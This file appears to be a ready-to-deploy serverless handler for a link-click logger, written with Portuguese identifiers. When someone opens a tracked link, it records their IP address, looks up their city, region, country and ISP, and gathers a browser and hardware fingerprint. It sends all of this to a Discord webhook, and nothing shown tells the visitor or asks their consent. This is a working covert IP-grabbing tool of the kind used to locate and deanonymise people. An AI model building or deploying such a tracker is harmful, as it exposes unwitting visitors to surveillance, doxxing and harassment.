export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).end();
  }

  const dadosCliente = req.body || {};

  const ip = (req.headers["x-forwarded-for"] || "")
    .split(",")[0]
    .trim() || req.socket?.remoteAddress;

  const userAgent = req.headers["user-agent"] || "Desconhecido";
  const timestamp = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });

  const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

  let localizacao = "Não identificada";
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=city,regionName,country,isp`);
    const geo = await geoRes.json();
    if (geo && geo.city) {
      localizacao = `${geo.city} - ${geo.regionName}, ${geo.country} (${geo.isp})`;
    }
  } catch (e) {}

  const dispositivo = /mobile/i.test(userAgent) ? "📱 Celular" : "💻 Computador";

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "🔗 Novo clique registrado",
          color: 0x5865f2,
          fields: [
            { name: "Link", value: `\`${dadosCliente.id || "?"}\``, inline: true },
            { name: "Dispositivo", value: dispositivo, inline: true },
            { name: "IP", value: ip || "Desconhecido", inline: true },
            { name: "Localização (IP)", value: localizacao, inline: false },
            { name: "Resolução de tela", value: dadosCliente.resolucaoTela || "?", inline: true },
            { name: "Fuso horário", value: dadosCliente.fusoHorario || "?", inline: true },
            { name: "Idiomas", value: dadosCliente.idiomas || "?", inline: true },
            { name: "Sistema", value: dadosCliente.plataforma || "?", inline: true },
            { name: "Núcleos CPU", value: String(dadosCliente.nucleosCPU || "?"), inline: true },
            { name: "RAM", value: dadosCliente.memoriaRAM || "?", inline: true },
            { name: "Tipo de conexão", value: dadosCliente.tipoConexao || "?", inline: true },
            { name: "Veio de", value: dadosCliente.referrerDocumento || "Direto", inline: false },
            { name: "Navegador", value: userAgent.slice(0, 200), inline: false },
          ],
          footer: { text: timestamp }
        }]
      })
    });
  } catch (e) {
    console.error("Erro no webhook:", e);
  }

  res.status(200).json({ ok: true });
}
